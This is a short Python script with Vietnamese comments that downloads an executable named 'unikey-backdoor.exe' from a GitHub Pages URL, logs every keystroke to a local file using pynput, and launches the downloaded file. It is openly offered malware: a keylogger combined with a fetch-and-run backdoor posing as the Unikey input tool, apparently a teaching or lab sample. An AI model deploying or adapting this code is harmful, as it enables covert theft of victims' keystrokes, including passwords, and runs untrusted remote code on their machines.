import requests

# Tự động tải file dev.exe từ server, lưu lại với tên unikey.exe
file_backdoor = "unikey-backdoor.exe"
url = f"https://tiennhm.github.io/key_logger/web/{file_backdoor}"
r = requests.get(url)

with open(file_backdoor, "wb") as f:
    f.write(r.content)

from pynput.keyboard import Key, Listener
import logging

# Đường dẫn file log
file_log = "keylog.txt"

# Ghi log
logging.basicConfig(
    filename=file_log, 
    level=logging.DEBUG, 
    format='%(message)s')

# Hàm ghi log khi nhấn phím
def on_press(key):
    logging.info(str(key))

# Lắng nghe sự kiện nhấn phím
with Listener(on_press=on_press) as listener:
    listener.join()


# Tạo tiến trình mới để chạy file unikey.exe
import os
os.system(f"start {file_backdoor}")